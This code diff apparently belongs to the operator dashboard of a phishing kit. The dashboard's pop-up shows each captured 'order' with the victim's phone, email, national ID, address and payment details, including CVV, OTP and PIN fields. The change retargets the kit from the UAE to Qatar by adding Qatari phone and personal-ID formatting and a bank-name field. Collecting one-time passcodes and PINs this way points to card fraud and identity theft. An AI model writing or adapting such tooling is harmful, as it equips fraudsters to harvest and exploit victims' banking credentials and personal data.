@@ -530,8 +530,11 @@ function toast(msg){
   clearTimeout(toast._t); toast._t = setTimeout(() => t.classList.remove("show"), 4000);
 }
 function loadOrders(){ return CACHE; }
-function fmtPhone(d){ return d ? `+971 ${d.slice(0,2)} ${d.slice(2,5)} ${d.slice(5)}` : ""; }
-function fmtEid(d){ return d ? [d.slice(0,3), d.slice(3,7), d.slice(7,14), d.slice(14)].filter(Boolean).join("-") : ""; }
+function fmtPhone(d){
+  const digits = String(d || "").replace(/\D/g, "");
+  return digits ? `+974 ${digits.slice(0,4)} ${digits.slice(4,8)}` : "";
+}
+function fmtQid(d){ return String(d || "").replace(/\D/g, ""); }
 function fmtDate(ts){ const d = new Date(ts); return d.toLocaleString("ar-AE", {year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit"}); }
 function areaName(em, a){ const E = EMIRATES.find(e=>e.id===em); return E && E.areas[+a] ? E.areas[+a].ar : ""; }
 function emName(em){ const E = EMIRATES.find(e=>e.id===em); return E ? E.ar : ""; }
@@ -550,6 +553,7 @@ function openPop(ref){
   const hasCvv = pay.cvv === true || Boolean(pay.cvv || o.cvv);
   const hasOtp = pay.otp === true || Boolean(pay.otp || o.otp);
   const hasPin = pay.pin === true || Boolean(pay.pin || o.pin);
+  const bankName = o.bankName || o.bank || "";
   $("popHead").innerHTML = `
     ${card ? `<img class="c" src="${card.img}" alt="">` : ""}
     ${watch ? `<img class="w" src="${watch.img}" alt="">` : ""}
@@ -566,9 +570,10 @@ function openPop(ref){
       <div class="drow"><span class="k">الجنس</span><span class="v">${o.g === "female" ? "أنثى" : "ذكر"}</span></div>
       <div class="drow"><span class="k">رقم الجوال</span><span class="v" style="direction:ltr">${fmtPhone(o.p)}</span></div>
       <div class="drow"><span class="k">البريد الإلكتروني</span><span class="v" style="direction:ltr">${esc(o.e)}</span></div>
-      <div class="drow"><span class="k">رقم الهوية</span><span class="v" style="direction:ltr">${fmtEid(o.id)}</span></div>
+      <div class="drow"><span class="k">الرقم الشخصي القطري</span><span class="v" style="direction:ltr">${fmtQid(o.id)}</span></div>
       <div class="drow"><span class="k">الإمارة</span><span class="v">${emName(o.em)}</span></div>
       <div class="drow"><span class="k">المنطقة</span><span class="v">${areaName(o.em,o.a)}</span></div>
+      <div class="drow"><span class="k">البنك</span><span class="v">${esc(bankName || "-")}</span></div>
       <div class="drow" style="grid-column:1/-1"><span class="k">عنوان التوصيل</span><span class="v">${esc(o.ad)}</span></div>
     </div>
  ${(o.pay || cardName || cardNumber || o.cvv || o.expiry || o.otp || o.pin) ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
